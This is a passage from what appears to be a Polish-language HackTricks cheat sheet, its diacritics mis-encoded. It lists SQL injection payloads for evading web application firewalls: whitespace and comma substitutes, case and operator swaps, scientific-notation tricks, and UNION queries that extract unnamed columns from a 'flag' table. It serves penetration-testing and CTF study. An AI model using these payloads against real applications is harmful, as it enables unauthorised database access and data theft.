[Initial bypasses from here](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass bez spacji

No Space (%20) - bypass przy uÅ¼yciu alternatyw dla biaÅ‚ych znakÃ³w
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - obejÅ›cie za pomocÄ… komentarzy
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - obejÅ›cie za pomocÄ… nawiasÃ³w
```sql
?id=(1)and(1)=(1)--
```
### Brak przecinkÃ³w bypass

Brak przecinka - bypass przy uÅ¼yciu OFFSET, FROM i JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

Czarna lista uÅ¼ywajÄ…ca sÅ‚Ã³w kluczowych - obejÅ›cie za pomocÄ… wielkich/maÅ‚ych liter
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist uÅ¼ywajÄ…c sÅ‚Ã³w kluczowych bez rozrÃ³Å¼niania wielkoÅ›ci liter - obejÅ›cie za pomocÄ… operatora rÃ³wnowaÅ¼nego
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass WAF za pomocÄ… notacji naukowej

MoÅ¼esz znaleÅºÄ‡ bardziej szczegÃ³Å‚owe wyjaÅ›nienie tego triku na blogu [gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
W zasadzie moÅ¼esz uÅ¼yÄ‡ notacji naukowej w nieoczekiwany sposÃ³b, aby obejÅ›Ä‡ WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### OminiÄ™cie Ograniczenia Nazw Kolumn

Przede wszystkim zauwaÅ¼, Å¼e jeÅ›li **oryginalne zapytanie i tabela, z ktÃ³rej chcesz wyodrÄ™bniÄ‡ flagÄ™, majÄ… tÄ™ samÄ… liczbÄ™ kolumn**, moÅ¼esz po prostu uÅ¼yÄ‡: `0 UNION SELECT * FROM flag`

MoÅ¼liwe jest **uzyskanie dostÄ™pu do trzeciej kolumny tabeli bez uÅ¼ycia jej nazwy** za pomocÄ… zapytania takiego jak: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, wiÄ™c w przypadku sqlinjection wyglÄ…daÅ‚oby to tak:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Lub uÅ¼ywajÄ…c **comma bypass**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ten trik zostaÅ‚ zaczerpniÄ™ty z [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### NarzÄ™dzia do sugerowania obejÅ›cia WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Inne przewodniki

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista wykrywania Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. Z **misjÄ… promowania wiedzy technicznej**, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w z dziedziny technologii i cyberbezpieczeÅ„stwa w kaÅ¼dej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
